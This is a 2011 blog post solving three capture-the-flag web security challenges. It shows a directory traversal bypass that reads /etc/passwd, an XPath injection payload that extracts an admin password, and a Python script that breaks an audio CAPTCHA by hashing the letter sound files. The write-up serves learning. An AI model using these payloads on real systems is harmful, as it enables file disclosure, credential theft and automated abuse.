@@ -1,0 +1,325 @@
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Solution to 8.8 AppSec Challenge</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=bac5711c0a">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=bac5711c0a">
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
+
+    <link rel="canonical" href="http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
+    <meta name="referrer" content="origin">
+    
+    <meta property="og:site_name" content="SPECT Research">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Solution to 8.8 AppSec Challenge">
+    <meta property="og:description" content="In this post I'll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome. Challenge...">
+    <meta property="og:url" content="http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
+    <meta property="article:published_time" content="2011-11-23T12:00:00.000Z">
+    <meta property="article:modified_time" content="2015-09-10T14:54:13.259Z">
+    <meta property="article:tag" content="security">
+    <meta property="article:tag" content="ctf">
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Solution to 8.8 AppSec Challenge">
+    <meta name="twitter:description" content="In this post I'll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome. Challenge...">
+    <meta name="twitter:url" content="http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "SPECT Research",
+    "author": {
+        "@type": "Person",
+        "name": "Claudio Salazar",
+        "image": "//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&d=mm&r=x",
+        "url": "http://www.spect.cl/author/claudio",
+        "sameAs": null,
+        "description": null
+    },
+    "headline": "Solution to 8.8 AppSec Challenge",
+    "url": "http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/",
+    "datePublished": "2011-11-23T12:00:00.000Z",
+    "dateModified": "2015-09-10T14:54:13.259Z",
+    "keywords": "security, ctf",
+    "description": "In this post I&#x27;ll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won&#x27;t be very detailed. Any information on other ways to solve it are welcome. Challenge..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.7">
+    <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
+    <script>
+var disqus_shortname = 'spectresearch';
+var ga_id = 'UA-18043187-1';
+</script>
+</head>
+
+<body><header class="main-header no-cover">
+    <div class="vertical">
+        <div class="main-header-content inner">
+            <h1 class="page-title">SPECT Research</h1>
+            <h2 class="page-description">Security and Software Development</h2>
+            <br>
+            <div>
+              <a class="spectnav" href="/"><i class="fa fa-home"></i> Home</a>
+              <a class="spectnav" href="/about/"><i class="fa fa-group"></i> About us</a>
+              <a class="spectnav" href="/projects/"><i class="fa fa-copy"></i> Projects</a>
+              <a class="spectnav" href="/education/"><i class="fa fa-book"></i> Education</a>
+            </div>
+            <div>
+              <a class="spectnav" href="http://github.com/spectresearch"><i class="spectnav fa fa-github"></i></a>
+              <a class="spectnav" href="http://twitter.com/spectresearch"><i class="spectnav fa fa-twitter"></i></a>
+            </div>
+        </div>
+    </div>
+    <a class="scroll-down icon-arrow-left" href="#content" data-offset="-45"><span class="hidden">Scroll Down</span></a>
+</header>
+
+
+
+    
+
+    <div class="site-wrapper">
+
+        
+
+
+<main class="content" role="main">
+    <article class="post tag-security tag-ctf">
+
+        <header class="post-header">
+            <h1 class="post-title">Solution to 8.8 AppSec Challenge</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2011-11-23">23 November 2011</time>  on <a href="/tag/security/">security</a>, <a href="/tag/ctf/">ctf</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <p>In this post I'll show the solution to the three challenges of <em><a href="http://www.8dot8.org/">8dot8</a> AppSec Challenge</em>. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome.</p>
+
+<h2 id="challenge1directorytraversal">Challenge 1: Directory Traversal</h2>
+
+<p>The challenge lied in including successfully the file <code>/etc/passwd</code> through a parameter vulnerable to a <em>Directory  Traversal</em> attack. Although, the exploitation wasn't immediate. The passed value through the parameter was sanitized by a function that doesn't allow to scale directories to reach the desired file. To illustrate what happened, the following code snippet.</p>
+
+<pre><code class="language- language-python">&gt;&gt;&gt; param = '../../../../../../etc/passwd'
+&gt;&gt;&gt; param.replace('../', '')
+'etc/passwd'  
+</code></pre>
+
+<p>With those conditions, I had to find a vector that could bypass that sanitization function. The pattern is showed next.</p>
+
+<pre><code class="language- language-python">&gt;&gt;&gt; param = '....//....//....//....//....//....//etc/passwd'
+&gt;&gt;&gt; param.replace('../', '')
+'../../../../../../etc/passwd'  
+</code></pre>
+
+<p>With that vector the challenge was solved.</p>
+
+<h2 id="challenge2xpathinjection">Challenge 2: XPath Injection</h2>
+
+<p>The second challenge involved a form vulnerable to <em>XPath Injection</em>. If even it could be solved using the <em>Blind XPath Injection</em> technique, first confirming the length with <code>string-length(/users/user[1]/password)</code> and then getting the chars with <code>substring()</code>, I utilized the concatenation. The admin password had to be concatenated with the second user's name, and it should show  <code>admin_password+name_second_user</code>, however it showed the admin password. My vector of attack to get the admin's password was: </p>
+
+<p><code>1]/password|/users/user[2</code></p>
+
+<p>With the above vector, the final string was: <code>/users/user[1]/password|/users/user[2]/name</code></p>
+
+<p>As result, I got:</p>
+
+<pre><code class="language- language-html">/users/user[1]/password|/users/user[2]/name --&gt;Wrong password!&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+    &lt;form method="POST" action=""&gt;
+    &lt;label for="user"&gt;User:&lt;/label&gt;&lt;br/&gt;
+    &lt;input id="user" name="user" value="iLovePwnies"/&gt;&lt;br/&gt;
+</code></pre>
+
+<h2 id="challenge3captcha">Challenge 3: Captcha</h2>
+
+<p>I found the last challenge the most entertaining to solve. It was a <em>CAPTCHA</em> with images hard to decrypt through some script, but it had the option to play the audio with each letter present in the <em>CAPTCHA</em> word. The security flaw was added with that feature since, in spite of the name of the audio files were <br>
+random, each word was always the same word pronounced.</p>
+
+<p>For this challenge, I first downloaded the audio files and I created my letter dictionary, relating the <em>MD5</em> sum of each audio file with its pronounced letter, up to complete the alphabet. Then, the script requested the page with the <em>CAPTCHA</em>, reviewed the <em>HTML</em> code, got the audio filenames, downloaded them and the script compared their <em>MD5</em> sum to the sums in my letter dictionary. That procedure returned me the key. All that 2500 times, because it was necessary to solve 500 CAPTCHAS of 5 letters each one. The code was the following:</p>
+
+<pre><code class="language- language-python">#!/usr/bin/env python
+import sys  
+import urllib  
+import urllib2  
+import re  
+import hashlib  
+import os  
+import socket
+
+origGetAddrInfo = socket.getaddrinfo
+
+def getAddrInfoWrapper(host, port, family=0, socktype=0, proto=0, flags=0):  
+    return origGetAddrInfo(host, port, socket.AF_INET, socktype, proto, flags)
+
+# replace the original socket.getaddrinfo by our version
+socket.getaddrinfo = getAddrInfoWrapper
+
+letters = {  
+    'A': 'fc630d2b617c8b7e94c4812bfdb4c151',
+    'B': '8ff4175902822c97a2f198bb17b596c8',
+    'C': 'd6e9c5eb4bf9e2bb50dadf197fd9f9ad',
+    'D': 'fc756bdca7c344c0b3a96f9fb9f3ca23',
+    'E': '76f061e25691fe8c37fc12948a68c776',
+    'F': '37db61f33af775fe40675c98810851d4',
+    'G': '910352bd873c9d541f329cfdd348910d',
+    'H': 'e8ddefee7523fd2947b7493eab90f895',
+    'I': '1830ef4838c5149155f49e41d049af46',
+    'J': 'dd9823c94ee36251f68a746862f87018',
+    'K': 'df64287d9b711ee4a19b1d158ca4aa35',
+    'L': '64cb2a64734a34d59d10d4ebb05e9d0e',
+    'M': '4ac77b8f485b4050dc395aa52d812a9d',
+    'N': '2aca06e764670cf4855e22da6d9ff00d',
+    'O': '94fb69e7a14c15f4598ce122b7991436',
+    'P': 'de2178a2bb4570b3c4c1a55e0432bb61',
+    'Q': '8691e9fa1d84c9295f5f695580bfd4c3',
+    'R': '0e680cb2891cf82f8941df92f2a384e3',
+    'S': '33db6e42a8930f521263ba4818c4e835',
+    'T': '4b3266346cfc6255b1bd031d62aaf5e3',
+    'U': 'c4cc3f1a52e8e8fd1b9ee0e4f1885baa',
+    'V': '919f5e551b7a319338523725d4d8f96a',
+    'W': 'fb960f767bd6f8f210115aa6faa7d936',
+    'X': 'c48d1f2c8e957e03538a0c780b11f0b6',
+    'Y': 'bcfb544b8b6040021322023c8f3e2a5c',
+    'Z': '684fcaa5a5c61c317b7b3ad2575a8066'
+}
+
+i = 0  
+captcha = ''  
+url = 'https://challenge.dreamlab.net/?captcha=%s&amp;page=challenge&amp;cid=11'  
+play_url = 'https://challenge.dreamlab.net/challenges_dir/11/playAudio.php?audio=%s'  
+cookie = 'PHPSESSID=eo251g8dl5obdbvjjbm49kmeg3'  
+pattern = re.compile('var soundQueue = new Array\(\n\t"(.*)","x"')  
+score = re.compile('You\'ve solved &lt;em&gt;(\d+)&lt;/em&gt;')
+
+while True:  
+    print 'Requesting %s' % (url % captcha)
+    req = urllib2.Request(url % captcha)
+    req.add_header('Cookie', cookie)
+    response = urllib2.urlopen(req).read()
+
+    c = score.search(response)
+    if c:
+        print 'Captchas resolved: %s' % c.groups()[0]
+
+    m = pattern.search(response)
+    sounds = m.groups()[0].split('","')
+
+    captcha = ''
+    for s in sounds:
+        req = urllib2.Request(play_url % s)
+        req.add_header('Cookie', cookie)
+        response = urllib2.urlopen(req).read()
+
+        md5 = hashlib.md5(response).hexdigest()
+        captcha += [k for k, v in letters.iteritems() if v == md5][0]
+
+    i = i + 1
+    print 'Sending packet #%d' % i
+</code></pre>
+
+<p>Greetings and I wait another solutions!</p>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="/author/claudio/" style="background-image: url(//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&amp;d=mm&amp;r=x)"><span class="hidden">Claudio Salazar's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="/author/claudio/">Claudio Salazar</a></h4>
+
+                    <p>Read <a href="/author/claudio/">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Solution%20to%208.8%20AppSec%20Challenge&amp;url=http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        <footer class="post comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+  (function() {
+  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+  dsq.src = '//' + window.disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</footer>
+
+        </footer>
+
+    </article>
+</main>
+
+<aside class="read-next">
+    <a class="read-next-story no-cover" href="/blog/2011/12/d-link-dir-600-command-injection-vulnerability/">
+        <section class="post">
+            <h2>D-Link DIR-600 Command Injection Vulnerability</h2>
+            <p>In February I contacted D-Link Chile, then D-Link Latin America but I never received an official answer for my…</p>
+        </section>
+    </a>
+    <a class="read-next-story prev no-cover" href="/blog/2011/08/say-hello-to-translatify/">
+        <section class="post">
+            <h2>Say Hello to Translatify</h2>
+            <p>Two weeks ago I started the development of Translatify, a Google Chrome extension to make easy the translation of…</p>
+        </section>
+    </a>
+</aside>
+
+
+
+        <footer class="site-footer clearfix">
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2015</section>
+        </footer>
+
+    </div>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <script>
+  if (window.ga_id) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', window.ga_id, 'auto');
+    ga('require', 'linkid', 'linkid.js');
+    ga('send', 'pageview');
+  }
+</script>
+
+    <script type="text/javascript" src="/assets/js/prism.js?v=bac5711c0a"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=bac5711c0a"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=bac5711c0a"></script>
+
+
+</body>
